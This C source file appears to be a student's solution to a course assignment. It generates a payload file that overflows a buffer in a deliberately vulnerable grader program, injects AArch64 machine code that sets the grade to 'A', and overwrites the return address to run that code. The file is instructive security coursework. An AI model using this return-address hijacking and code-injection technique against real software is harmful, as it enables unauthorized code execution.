/*--------------------------------------------------------------------*
 * createdataA.c                                                    *
 * Purpose: To produce a file named dataA that will earn an A grade. *
 * This program exploits a buffer overflow in the readString function *
 * to overwrite the return address. The attack writes the user's name *
 * followed by machine code instructions that set the grade to 'A' and *
 * branch back to main. These instructions are written to the buffer, *
 * which gets copied to BSS. The return address is overwritten to point *
 * to where the instructions will be located in BSS after the copy.    *
 *--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

/*
 * main: Generates a data file that will cause the grader program to  
 * output the user's name and recommend a grade of "A".
 * 
 * Command-line arguments: None.
 * Reads from: stdin (none).
 * Writes to: dataA file (binary).
 * Returns: 0 on success, non-zero on failure.
 */
int main() {
    FILE *pFileA;
    size_t instruction;

    /* Student name to write to file */
    char name[] = "Zara Hommez\0";
    /* Name string length + null byte: 12 bytes */
    /* already 4-byte aligned*/
    size_t nameLen = strlen(name)+1;  
    /* Buffer is 48 bytes (BUFSIZE) */
    size_t bufLen = 48;
    /* Padding to fill the rest of the buffer after instructions */
    size_t paddingLen = bufLen - (nameLen+ 16);
    char* padding;
    unsigned long instructnameBSS = 0x420058;

    /* Address where instructions will start in BSS after copy */
    instructnameBSS += nameLen;

    pFileA = fopen("dataA", "wb");
    if (pFileA == NULL) {
        perror("Failed to open dataA");
        return EXIT_FAILURE;
    }
    
    /* Write name + null byte to file */
    fwrite(name, 1, nameLen, pFileA);

    /* adr x0, 0x420044 (address of grade variable ) */
   instruction = MiniAssembler_adr(0, 0x420044, instructnameBSS);
   fwrite(&instruction, sizeof(instruction), 1, pFileA);

   
    /* mov w1, 'A' */
    instruction = MiniAssembler_mov(1, 'A');
    fwrite(&instruction, sizeof(instruction), 1, pFileA);

    
    /* strb w1, [x0] */
    /* tores the byte in w1 to the address in x0 (grade variable) */
    instruction = MiniAssembler_strb(1, 0);
    fwrite(&instruction, sizeof(instruction), 1, pFileA);

    
    /* b 0x40089c (back to main, right before printf) */
    instruction = MiniAssembler_b(0x40089c, instructnameBSS + 12);
    fwrite(&instruction, sizeof(instruction), 1, pFileA);

    /* Add padding bytes to fill the remaining buffer space */
    padding = (char *)calloc(paddingLen, 1);
    if (padding == NULL)
    {
       perror("Memory allocation failed");
       fclose(pFileA);
       return EXIT_FAILURE;
    }
    /* fill padding with P bytes for visibility */
    memset(padding, 'P', paddingLen);
    fwrite(padding, 1, paddingLen, pFileA);
    free(padding);

    /* Write address of instructions in BSS to overwrite x30 */
    fwrite(&instructnameBSS, sizeof(unsigned long), 1, pFileA);

    /*Close file */
    fclose(pFileA);
    return EXIT_SUCCESS;
} 








